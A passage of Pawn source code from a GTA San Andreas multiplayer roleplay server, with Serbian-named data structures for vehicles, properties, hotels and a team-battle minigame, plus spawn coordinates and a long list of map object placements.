	{ 1189, "Chrome Front Bumper", 100, CARMODTYPE_FRONT_BUMPER },
	{ 1190, "Slamin Front Bumper", 100, CARMODTYPE_FRONT_BUMPER },
	{ 1191, "Chrome Front Bumper", 100, CARMODTYPE_FRONT_BUMPER },
	{ 1192, "Chrome Rear Bumper", 100, CARMODTYPE_REAR_BUMPER },
	{ 1193, "Slamin Rear Bumper", 100, CARMODTYPE_REAR_BUMPER }
};


enum tpi {
	tID,
	tType,
	bool:tPaintjob,
	PJColor[ 2 ]
};
new TPInfo[ MAX_PLAYERS ][ tpi ];

#define MAX_GOBJ 1000
enum dGunEnum {
	Float:ObjPos[ 3 ],
	gObjID,
	ObjData[ 2 ]
};
new dGunData[ MAX_GOBJ ][ dGunEnum ];
new Text3D:gunLabel[MAX_GOBJ];

//=================================[ Vozila ]===================================

enum vVoziloInfo {
	vOwned,
	vPrice,
	vOwner[ MAX_PLAYER_NAME ],
	vLocked,
	Float:vLokacijaX,
	Float:vLokacijaY,
	Float:vLokacijaZ,
	Float:vLokacijaA,
	vVirtualWorld,
	vInterior,
	vUsage,
	vJob,
	vOrganization,
	vColor1,
	vColor2,
	vModel,
	vTeh,
	vReg,
	vGPS,
	vOsiguranje,
	vLock,
	vAlarm,
	vFuel,
	vNeon,
	vTuned,
	vImobilizator,
	vSpoiler,
	vHood,
	vRoof,
	vSkirt,
	vLamps,
	vNitro,
	vExhaust,
	vWheels,
	vStereo,
	vHydraulics,
	vFrontBumper,
	vRearBumper,
	vVents,
	vPaintJob,
	vProvera,
	vDrug[ 6 ],
	vDrugCode[ 6 ],
	vMelee,
	vWeap1,
	vAmmo1,
	vWeap2,
	vAmmo2,
	vGajbica[ 5 ],
	vGajbicaAmmount[ 5 ],
	vNeaktivnost,
	vKilometri,
	vMetri,
	vID,
    vCipovanje
}
new VehicleInfo[ MAX_CARS ][ vVoziloInfo ];

//=================================[ Imovina ]==================================

#define IM_FILE 								     			"Imovina/%i.ini"
#define MAX_IMOVINA 													    1500

#define IMOVINA_KUCA    													   1
#define IMOVINA_STAN 												   		   2
#define IMOVINA_VIKENDICA													   3

#define MALA_KUCA 													   		   1
#define SREDNJA_KUCA 													   	   2
#define VELIKA_KUCA 													   	   3
#define PENTHOUSE_KUCA 													   	   4

#define MALA_KUCA_X                                                    -270.7367
#define MALA_KUCA_Y                                                    1156.8273
#define MALA_KUCA_Z                                                     -65.9143
#define MALA_KUCA_PRICE                                                   300000
#define MALA_KUCA_INT                                                          0

#define SREDNJA_KUCA_X                                                  370.0410
#define SREDNJA_KUCA_Y                                                 2513.7578
#define SREDNJA_KUCA_Z                                                  -60.4204
#define SREDNJA_KUCA_PRICE                                                500000
#define SREDNJA_KUCA_INT                                                       0

#define VELIKA_KUCA_X                                                  1790.5209
#define VELIKA_KUCA_Y                                                  1312.2292
#define VELIKA_KUCA_Z 													-75.5661
#define VELIKA_KUCA_PRICE                                                 750000
#define VELIKA_KUCA_INT                                                       0

#define PENTHOUSE_KUCA_X                                               1418.1833
#define PENTHOUSE_KUCA_Y                                              -1468.9042
#define PENTHOUSE_KUCA_Z                                                108.8004
#define PENTHOUSE_KUCA_PRICE                                             1000000
#define PENTHOUSE_KUCA_INT                                                    0

#define STAN_X                                                     	   6.5643
#define STAN_Y                                                         1522.4727
#define STAN_Z                                                          -65.1317
#define STAN_PRICE                                                    	  100000
#define STAN_INT															   0

#define VIKENDICA_X                                                    1472.5632
#define VIKENDICA_Y                                                    -215.5871
#define VIKENDICA_Z                                                    1935.7340
#define VIKENDICA_PRICE                                                   350000
#define VIKENDICA_INT 													       0

new ObjectEdition_TYPE[ MAX_PLAYERS ];

enum Imovina
{
	iOwned,
	iOwner[ MAX_PLAYER_NAME ],
	iUsage,
	Float:iEnter[ 3 ],
	Float:iExit[ 3 ],
	iPrice,
    iLocked,
	iInterior,
	iVW,
	iVrsta,
	iOrmar,
	iSkin[ 3 ],
	iSafeStatus,
	iSafePass,
	iOruzje[ 4 ],
	iMunicija[ 4 ],
	iDrug[ 10 ],
	iDrugCode[ 10 ],
	iDoorLevel,
	iAlarm,
	iLockLevel,
	iTime,
	Float:iPizzaTime,
	iLevel,
	iAdress[ 38 ],
	iNeaktivnost,
	iRentable,
	iRentPrice,
	iRentovano,
	iMoney
};
new II[ MAX_IMOVINA ][ Imovina ];
new ImovinaPickup[ MAX_IMOVINA ];
new Text3D:ImovinaLabel[ MAX_IMOVINA ];

//=================================[ Hoteli ]===================================

#define MAX_HOTELS 															 100
#define HOTEL_FILE 								     	    	 "Hoteli/%i.ini"

enum hotelData {
	hOwned,
	hOwner[ MAX_PLAYER_NAME ],
	Float:hEnter[ 3 ],
	Float:hExit[ 3 ],
	hInterior,
	hVW,
	hPrice,
	hLocked,
	hLevel,
	hAdress[ 38 ],
	hRoomPrice,
	hMoney,
	hGuest_1[ MAX_PLAYER_NAME ],
	hGuest_2[ MAX_PLAYER_NAME ],
	hGuest_3[ MAX_PLAYER_NAME ],
	hGuest_4[ MAX_PLAYER_NAME ],
	hGuest_5[ MAX_PLAYER_NAME ],
	hGuest_6[ MAX_PLAYER_NAME ],
	hGuest_7[ MAX_PLAYER_NAME ],
	hGuest_8[ MAX_PLAYER_NAME ],
	hGuest_9[ MAX_PLAYER_NAME ],
	hGuest_10[ MAX_PLAYER_NAME ],
	hPorez,
	hVrednostPoreza,
	hPickup,
	Text3D:h3DText
}
new hotelInfo[ MAX_HOTELS ][ hotelData ];

//================================[ WAR ]=======================================
//////////////////////////////////// WAR SISTEM

#define MAX_WARS    20
#define COL_ORANGE                                                    "{FFAF00}"
#define COL_WHITE                                                     "{FFFFFF}"
#define COL_TEAM1                                                     "{F81414}"
#define COL_TEAM2                                                     "{0049FF}"

new PlayerText:WARTextDraw[ MAX_PLAYERS ][ 9 ];



enum WAR {
    bool:warCreating,
    bool:warActive,
    warTeamScore[ 2 ],
    warGuns[ 4 ],
    warMap,
    warMapMembers,
    warTeamMembers[ 2 ],
    warTeamLeader[ 2 ],
    warTimer,
    warTimerSec,
    warTimerMin,
    warTimerTime
}
new WARInfo[ MAX_WARS ][ WAR ];

enum WARI {
    bool:warTeam[ 2 ],
    warKills,
    warDeaths,
    warID,
    Float:LastPosition[ 3 ],
    LastInterior,
    LastVirtualWorld
}
new WARPInfo[ MAX_PLAYERS ][ WARI ];

new CreatingWAR[ MAX_PLAYERS ];


new Float:warMap1Team1[ 9 ][ 3 ] = {
    { 1147.9226,2813.0664,10.8125 },
    { 1148.4319,2809.7048,10.8203 },
    { 1148.7649,2805.6304,10.8203 },
    { 1151.0385,2800.8855,10.8203 },
    { 1155.1233,2800.9697,10.8203 },
    { 1155.0419,2805.0557,10.8203 },
    { 1144.4396,2799.8264,10.8125 },
    { 1139.9843,2806.2156,10.9688 },
    { 1140.9631,2812.3542,10.9190 }
};

new Float:warMap1Team2[ 9 ][ 3 ] = {
    { 1403.0447,2733.0447,10.8126 },
    { 1410.5400,2737.9583,10.8203 },
    { 1414.4192,2747.7236,10.8203 },
    { 1411.3033,2757.2588,11.2597 },
    { 1399.9032,2750.0581,10.8203 },
    { 1391.1559,2744.3250,10.8203 },
    { 1384.0992,2743.9656,10.8203 },
    { 1388.7274,2728.1936,10.8203 },
    { 1379.5826,2729.1980,10.8203 }
};

new Float:warMap2Team1[ 7 ][ 3 ] = {
    { -972.6812,1096.0303,1344.9882 },
    { -972.5949,1084.3115,1344.9950 },
    { -973.4254,1076.6229,1344.9950 },
    { -973.5809,1070.1228,1345.0007 },
    { -973.7216,1064.7092,1345.0061 },
    { -973.6556,1056.8405,1345.0156 },
    { -973.0229,1024.2570,1345.0525 }
};

new Float:warMap2Team2[ 7 ][ 3 ] = {
    { -1132.7081,1022.7668,1345.7273 },
    { -1132.6602,1035.5205,1345.7427 },
    { -1132.2740,1041.1238,1345.7412 },
    { -1131.0614,1048.8101,1345.7435 },
    { -1132.0385,1055.2090,1345.7603 },
    { -1132.0372,1063.7393,1345.7628 },
    { -1131.6272,1094.3673,1345.7885 }
};

new Float:warMap3Team1[ 4 ][ 3 ] = {
    { 1295.8276,1070.7544,10.7652 },
    { 1293.9846,1078.9841,10.6999 },
    { 1300.7595,1085.3835,10.8203 },
    { 1312.7617,1084.8655,10.8203}
};

new Float:warMap3Team2[ 4 ][ 3 ] = {
    { 1492.2148,916.9006,10.9297 },
    { 1478.9260,916.6356,10.8203 },
    { 1467.7583,915.6778,10.8203 },
    { 1471.7261,930.1809,10.8203 }
};

new Float:warMap4Team1[ 5 ][ 3 ] = {
    { 2922.0735,4057.7339,41.9413 },
    { 2924.9233,4058.4211,41.9413 },
    { 2925.6855,4053.5361,41.9413 },
    { 2926.5029,4045.3936,41.9413 },
    { 2921.1628,4044.2600,41.9413 }
};

new Float:warMap4Team2[ 5 ][ 3 ] = {
    { 2925.1416,4300.6401,41.9413 },
    { 2923.4927,4307.6055,41.9413 },
    { 2927.1511,4311.6382,41.9413 },
    { 2930.3958,4310.5850,41.9413 },
    { 2931.5002,4302.3281,41.9413 }
};

new Float:warMap5Team1[ 4 ][ 3 ] = {
    { -136.6962,-114.7337,3.1172 },
    { -126.6221,-115.4705,3.1172 },
    { -104.1388,-119.4517,3.1172 },
    { -84.2369,-121.1719,3.1172 }
};

new Float:warMap5Team2[ 4 ][ 3 ] = {
    { 0.4129,91.1095,3.1172 },
    { -22.3045,108.2041,3.1172 },
    { -45.0152,113.6356,3.1172 },
    { -77.4174,134.2272,3.1172 }
};

new Float:warMap6Team1[6][3] =
{
    {-2100.2681, -275.4084, 35.3203}, // Urban Tim 1 - Spawn 1
    {-2116.8984, -275.1729, 35.3203}, // Urban Tim 1 - Spawn 2
    {-2123.1079, -265.9467, 35.3203}, // Urban Tim 1 - Spawn 3
    {-2136.0432, -266.1573, 35.3203}, // Urban Tim 1 - Spawn 4
    {-2135.2561, -255.6641, 35.3203}, // Urban Tim 1 - Spawn 5
    {-2100.5254, -260.5247, 35.3203} // Urban Tim 1 - Spawn 6
};
new Float:warMap6Team2[6][3] =
{
    {-2099.5916, -84.9632, 35.3273}, // Urban Tim 2 - Spawn 1
    {-2101.7798, -93.8699, 35.3273}, // Urban Tim 2 - Spawn 2
    {-2108.8240, -85.1621, 35.3273}, // Urban Tim 2 - Spawn 3
    {-2111.8167, -94.7272, 35.3203}, // Urban Tim 2 - Spawn 4
    {-2135.4783, -90.0242, 35.3203}, // Urban Tim 2 - Spawn 5
    {-2140.8054, -98.4146, 35.3203} // Urban Tim 2 - Spawn 6
};

//-------------------------------[Stocks]---------------------------------------

stock CreateWarMaps( ) {

    // WAR MAP FREE 1
    CreateDynamicObject(987, 1402.24536, 2725.05518, 9.80886,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, 1390.26404, 2725.06543, 9.80886,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, 1378.31885, 2725.07349, 9.80886,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, 1366.35645, 2725.08228, 9.80886,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, 1354.41626, 2725.06909, 9.80886,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, 1342.46826, 2725.05127, 9.80886,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, 1330.49927, 2725.06299, 9.80886,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, 1318.52832, 2725.06982, 9.80886,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, 1306.56763, 2725.06885, 9.80886,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, 1294.60339, 2725.07227, 9.80886,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, 1282.63672, 2725.05591, 9.80886,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, 1270.67261, 2725.07129, 9.80886,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, 1258.72913, 2725.08618, 9.80886,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, 1246.76160, 2725.08960, 9.80886,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, 1234.81372, 2725.08594, 9.80886,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, 1222.89075, 2725.08862, 9.80886,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, 1210.91333, 2725.09033, 9.80886,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, 1198.95313, 2725.09375, 9.80886,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, 1186.97864, 2725.10913, 9.80886,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, 1175.02136, 2725.11401, 9.80886,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, 1163.05969, 2725.12476, 9.80886,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, 1151.07605, 2725.11548, 9.80886,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, 1139.09717, 2725.15405, 9.80886,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, 1127.13562, 2725.16724, 9.80886,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, 1115.20520, 2725.17578, 9.80886,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(987, 1115.34839, 2737.05737, 9.80890,   0.00000, 0.00000, -90.00000);
    CreateDynamicObject(987, 1115.33215, 2749.04248, 9.80890,   0.00000, 0.00000, -90.00000);
    CreateDynamicObject(987, 1115.29431, 2761.00757, 9.80890,   0.00000, 0.00000, -90.00000);
    CreateDynamicObject(987, 1115.27698, 2772.97949, 9.80890,   0.00000, 0.00000, -90.00000);
    CreateDynamicObject(987, 1115.26611, 2784.92017, 9.80890,   0.00000, 0.00000, -90.00000);
    CreateDynamicObject(987, 1115.26294, 2796.90186, 9.80890,   0.00000, 0.00000, -90.00000);
    CreateDynamicObject(987, 1115.25940, 2808.88159, 9.80890,   0.00000, 0.00000, -90.00000);
    CreateDynamicObject(987, 1115.25647, 2820.85303, 9.80890,   0.00000, 0.00000, -90.00000);
    CreateDynamicObject(987, 1115.24048, 2832.83887, 9.80890,   0.00000, 0.00000, -90.00000);
    CreateDynamicObject(987, 1115.23950, 2844.83472, 9.80890,   0.00000, 0.00000, -90.00000);
    CreateDynamicObject(987, 1115.24780, 2856.75928, 9.80890,   0.00000, 0.00000, -90.00000);
    CreateDynamicObject(987, 1115.22070, 2862.74048, 9.80890,   0.00000, 0.00000, -90.00000);
    CreateDynamicObject(987, 1127.12402, 2862.97852, 9.80890,   0.00000, 0.00000, -180.00000);
    CreateDynamicObject(987, 1139.06519, 2862.98975, 9.80890,   0.00000, 0.00000, -180.00000);
    CreateDynamicObject(987, 1151.01318, 2863.00220, 9.80890,   0.00000, 0.00000, -180.00000);
    CreateDynamicObject(987, 1162.96143, 2863.03613, 9.80890,   0.00000, 0.00000, -180.00000);
    CreateDynamicObject(987, 1174.92896, 2863.04810, 9.80890,   0.00000, 0.00000, -180.00000);
    CreateDynamicObject(987, 1186.89026, 2863.03076, 9.80890,   0.00000, 0.00000, -180.00000);
    CreateDynamicObject(987, 1198.87122, 2863.04126, 9.80890,   0.00000, 0.00000, -180.00000);
    CreateDynamicObject(987, 1210.81763, 2863.03394, 9.80890,   0.00000, 0.00000, -180.00000);
    CreateDynamicObject(987, 1222.73877, 2863.03052, 9.80890,   0.00000, 0.00000, -180.00000);
    CreateDynamicObject(987, 1234.70117, 2863.04736, 9.80890,   0.00000, 0.00000, -180.00000);
    CreateDynamicObject(987, 1246.66406, 2863.06421, 9.80890,   0.00000, 0.00000, -180.00000);
    CreateDynamicObject(987, 1258.64526, 2863.07935, 9.80890,   0.00000, 0.00000, -180.00000);
    CreateDynamicObject(987, 1270.60657, 2863.11597, 9.80890,   0.00000, 0.00000, -180.00000);
    CreateDynamicObject(987, 1282.54724, 2863.12769, 9.80890,   0.00000, 0.00000, -180.00000);
    CreateDynamicObject(987, 1294.50769, 2863.14014, 9.80890,   0.00000, 0.00000, -180.00000);
    CreateDynamicObject(987, 1306.46375, 2863.13843, 9.80890,   0.00000, 0.00000, -180.00000);
    CreateDynamicObject(987, 1318.41870, 2863.14063, 9.80890,   0.00000, 0.00000, -180.00000);
    CreateDynamicObject(987, 1330.35999, 2863.15503, 9.80890,   0.00000, 0.00000, -180.00000);
    CreateDynamicObject(987, 1342.32080, 2863.16919, 9.80890,   0.00000, 0.00000, -180.00000);
    CreateDynamicObject(987, 1354.26807, 2863.15820, 9.80890,   0.00000, 0.00000, -180.00000);
    CreateDynamicObject(987, 1366.20166, 2863.14795, 9.80890,   0.00000, 0.00000, -180.00000);
    CreateDynamicObject(987, 1378.16162, 2863.16138, 9.80890,   0.00000, 0.00000, -180.00000);
    CreateDynamicObject(987, 1390.08862, 2863.17212, 9.80890,   0.00000, 0.00000, -180.00000);
    CreateDynamicObject(987, 1402.01514, 2863.17798, 9.80890,   0.00000, 0.00000, -180.00000);
    CreateDynamicObject(987, 1413.96252, 2863.20532, 9.80890,   0.00000, 0.00000, -180.00000);
    CreateDynamicObject(987, 1416.96423, 2863.21606, 9.80890,   0.00000, 0.00000, -180.00000);
    CreateDynamicObject(987, 1416.89087, 2851.31323, 9.80890,   0.00000, 0.00000, -270.00000);
    CreateDynamicObject(987, 1416.87317, 2839.38721, 9.80890,   0.00000, 0.00000, -270.00000);
    CreateDynamicObject(987, 1416.87952, 2827.44702, 9.80890,   0.00000, 0.00000, -270.00000);
    CreateDynamicObject(987, 1416.89124, 2815.50659, 9.80890,   0.00000, 0.00000, -270.00000);
    CreateDynamicObject(987, 1427.16016, 2809.34521, 9.80890,   0.00000, 0.00000, -211.00000);
    CreateDynamicObject(987, 1437.34827, 2803.20337, 9.80890,   0.00000, 0.00000, -211.00000);
    CreateDynamicObject(987, 1414.16968, 2725.04785, 9.80890,   0.00000, 0.00000, 47.00000);
    CreateDynamicObject(987, 1422.31311, 2733.78906, 9.80890,   0.00000, 0.00000, 39.00000);
    CreateDynamicObject(3887, 1230.42151, 2796.69702, 7.29060,   0.00000, 0.00000, -156.00000);
    CreateDynamicObject(11441, 1350.94287, 2833.11011, 9.80600,   0.00000, 0.00000, 76.00000);
    CreateDynamicObject(3374, 1378.27673, 2802.86523, 11.30570,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(3374, 1343.54895, 2761.32080, 9.86570,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(3374, 1215.42517, 2760.70410, 11.30570,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(3374, 1197.53918, 2813.81812, 11.30570,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(3374, 1261.20776, 2837.02905, 11.28570,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1225, 1345.34375, 2821.74805, 10.21200,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(3887, 1392.30969, 2749.75195, 11.99060,   0.00000, 0.00000, -62.00000);
    CreateDynamicObject(1225, 1389.02783, 2822.76733, 10.21200,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1225, 1388.89087, 2824.23730, 10.21200,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1225, 1388.08826, 2823.26025, 10.21200,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1225, 1390.50586, 2811.41016, 10.23200,   0.00000, 91.00000, 76.00000);
    CreateDynamicObject(1225, 1405.41479, 2797.38818, 10.21200,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(11441, 1351.93457, 2824.92578, 9.80600,   0.00000, 0.00000, -164.00000);
    CreateDynamicObject(1225, 1345.27417, 2822.78687, 10.21200,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1225, 1336.10559, 2797.72266, 10.15200,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1225, 1335.11780, 2798.80396, 10.21200,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1225, 1340.89380, 2784.21606, 9.63200,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1225, 1340.35193, 2783.20654, 9.55200,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1225, 1341.02002, 2762.57544, 9.01200,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1225, 1340.58154, 2761.26416, 9.01200,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1225, 1374.03882, 2748.16919, 10.63200,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1225, 1387.54565, 2755.45483, 11.21200,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1225, 1386.31445, 2755.26904, 11.21200,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1225, 1309.16650, 2758.02100, 10.17200,   -0.04000, 0.00000, 0.00000);
    CreateDynamicObject(1225, 1308.42639, 2758.92725, 10.17200,   -0.04000, 0.00000, 0.00000);
    CreateDynamicObject(1225, 1286.70679, 2759.12500, 9.55200,   -0.04000, 0.00000, 0.00000);
    CreateDynamicObject(1225, 1287.17090, 2760.54395, 9.55200,   -0.04000, 0.00000, 0.00000);
    CreateDynamicObject(12957, 1284.31543, 2757.97754, 10.56130,   0.00000, 0.00000, -18.00000);
    CreateDynamicObject(1225, 1278.00623, 2768.32422, 10.17200,   90.00000, -2.00000, 0.00000);
    CreateDynamicObject(1225, 1268.38147, 2774.02905, 10.19200,   0.00000, -2.00000, 0.00000);
    CreateDynamicObject(1225, 1248.82690, 2774.68872, 10.19200,   0.00000, -2.00000, 0.00000);
    CreateDynamicObject(1225, 1242.80884, 2757.51929, 10.19200,   0.00000, -2.00000, 0.00000);
    CreateDynamicObject(1225, 1251.97766, 2741.87622, 9.59200,   0.00000, -2.00000, 0.00000);
    CreateDynamicObject(1225, 1234.04407, 2741.60352, 10.25200,   0.00000, -2.00000, 0.00000);
    CreateDynamicObject(11440, 1161.18787, 2802.94019, 9.20590,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1225, 1162.79236, 2806.82666, 12.66940,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(13591, 1201.63550, 2851.41064, 10.37750,   0.00000, 0.00000, 47.00000);
    CreateDynamicObject(1225, 1196.92114, 2847.86133, 10.27920,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1225, 1261.68506, 2839.84619, 10.29400,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(11440, 1318.50671, 2833.33472, 9.14880,   0.00000, 0.00000, 69.00000);
    CreateDynamicObject(1225, 1309.56897, 2828.14404, 10.17700,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1225, 1303.88879, 2809.01147, 10.21700,   0.00000, 91.00000, 0.00000);
    CreateDynamicObject(11443, 1393.70508, 2848.73633, 9.59060,   0.00000, 0.00000, -52.00000);
    CreateDynamicObject(1225, 1393.84058, 2846.14209, 10.12890,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1225, 1390.42456, 2848.55322, 10.12890,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(11443, 1183.32727, 2767.95508, 9.80886,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1225, 1186.34802, 2767.93628, 10.23610,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1225, 1185.02710, 2771.86255, 10.23610,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(3363, 1277.47925, 2799.51782, 9.80920,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1225, 1342.50500, 2841.29810, 10.21200,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1225, 1385.46948, 2781.96582, 10.33200,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(1225, 1385.95361, 2780.62671, 10.33200,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(12957, 1390.28198, 2782.74414, 10.61180,   0.00000, 0.00000, 0.00000);
    // WAR MAP FREE 2
    CreateDynamicObject(8171, 2946.0625, 4109.7930, 40.9413, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(8171, 2906.4460, 4109.7998, 40.9413, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(8171, 2887.0964, 4109.9063, 60.4812, 0.2350, 91.3100, 359.7500);
    CreateDynamicObject(8171, 2966.1877, 4109.6035, 60.5463, 0.2335, 89.3224, 180.0543);
    CreateDynamicObject(8171, 2906.4038, 4248.0059, 40.9413, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(8171, 2946.0469, 4248.0132, 40.9413, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(8171, 2887.6990, 4248.1597, 61.0062, 359.9807, 91.3074, 359.7473);
    CreateDynamicObject(8171, 2965.8220, 4247.4531, 60.0713, 0.2307, 89.3188, 180.2994);
    CreateDynamicObject(8171, 2926.5183, 4316.0449, 60.0213, 0.2307, 89.3134, 270.0416);
    CreateDynamicObject(8171, 2929.2061, 4041.4587, 60.0213, 0.2307, 89.3079, 90.1884);
    CreateDynamicObject(8171, 2946.4397, 4248.4385, 79.3963, 0.0000, 179.1900, 0.0000);
    CreateDynamicObject(8171, 2906.7041, 4248.4395, 78.8463, 0.0000, 179.1870, 0.0000);
    CreateDynamicObject(8171, 2906.6987, 4110.1406, 78.8463, 0.0000, 179.1870, 0.0000);
    CreateDynamicObject(3110, 2945.3767, 4153.6963, 38.6663, 0.0000, 0.0000, 5.9550);
    CreateDynamicObject(6052, 2898.2649, 4199.9722, 43.4139, 0.0000, 0.0000, 29.9100);
    CreateDynamicObject(6052, 2899.5896, 4199.0464, 43.0989, 359.5750, 177.1150, 284.2800);
    CreateDynamicObject(16084, 2901.1116, 4133.3525, 38.4913, 1.7500, 356.0300, 15.9700);
    CreateDynamicObject(3663, 2927.2021, 4166.1641, 43.0220, 0.0000, 0.0000, 272.2102);
    CreateDynamicObject(3663, 2927.0901, 4170.1211, 43.0220, 0.0000, 0.0000, 92.4481);
    CreateDynamicObject(16084, 2949.8240, 4213.4536, 37.3412, 1.7468, 356.0284, 191.4136);
    CreateDynamicObject(3269, 2905.7034, 4160.4521, 40.9413, 0.0000, 0.0000, 57.8350);
    CreateDynamicObject(12934, 2973.6648, 4161.0703, 44.3245, 0.0000, 0.0000, 48.1301);
    CreateDynamicObject(18260, 2940.8855, 4118.3267, 42.5145, 0.0000, 0.0000, 190.5106);
    CreateDynamicObject(2932, 2916.1472, 4044.9136, 42.3932, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(2932, 2930.3440, 4044.7532, 42.3932, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(2932, 2930.2915, 4054.1082, 42.3932, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(2932, 2915.9849, 4053.4519, 42.3932, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(2932, 2925.5251, 4061.8821, 42.3932, 0.0000, 0.0000, 90.5078);
    CreateDynamicObject(2932, 2918.3765, 4061.8315, 42.3932, 0.0000, 0.0000, 90.5054);
    CreateDynamicObject(2973, 2929.5278, 4071.7622, 40.9413, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(2973, 2933.3254, 4074.2947, 40.9413, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(2973, 2931.3643, 4073.2207, 43.3662, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(2973, 2934.2549, 4076.8298, 40.9413, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(2973, 2924.2859, 4078.3643, 40.9413, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(2973, 2920.9131, 4079.6577, 40.9413, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(2973, 2922.5464, 4079.2798, 43.3913, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(2973, 2914.6040, 4077.2412, 40.8763, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(2975, 2912.0498, 4076.4343, 40.9413, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(2975, 2912.0498, 4076.4336, 42.1663, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(2975, 2909.8635, 4076.1775, 42.1663, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(2975, 2909.8833, 4076.2266, 41.1663, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(2991, 2921.7510, 4103.8647, 41.5690, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(2991, 2921.7744, 4103.8726, 42.7690, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(2991, 2921.7744, 4103.8721, 43.9191, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(2934, 2935.0413, 4312.3618, 42.3932, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(2934, 2935.0022, 4303.6436, 42.3932, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(2934, 2920.7473, 4312.1729, 42.3932, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(2934, 2920.5190, 4302.8579, 42.3932, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(2934, 2922.3162, 4295.3857, 42.3932, 0.0000, 0.0000, 89.5101);
    CreateDynamicObject(2934, 2933.4146, 4295.3623, 42.3932, 0.0000, 0.0000, 90.0057);
    CreateDynamicObject(2934, 2926.8384, 4295.3472, 42.3932, 0.0000, 0.0000, 89.5056);
    CreateDynamicObject(2974, 2913.1233, 4281.4204, 40.9413, 0.0000, 0.0000, 119.6400);
    CreateDynamicObject(2974, 2915.3826, 4280.4678, 40.9413, 0.0000, 0.0000, 181.6455);
    CreateDynamicObject(2974, 2918.6296, 4280.6685, 40.9413, 0.0000, 0.0000, 269.3875);
    CreateDynamicObject(2974, 2927.0398, 4279.2568, 40.9413, 0.0000, 0.0000, 253.3698);
    CreateDynamicObject(2974, 2929.8049, 4279.1147, 40.9413, 0.0000, 0.0000, 279.3544);
    CreateDynamicObject(2974, 2928.8606, 4277.5688, 40.9413, 0.0000, 0.0000, 278.0994);
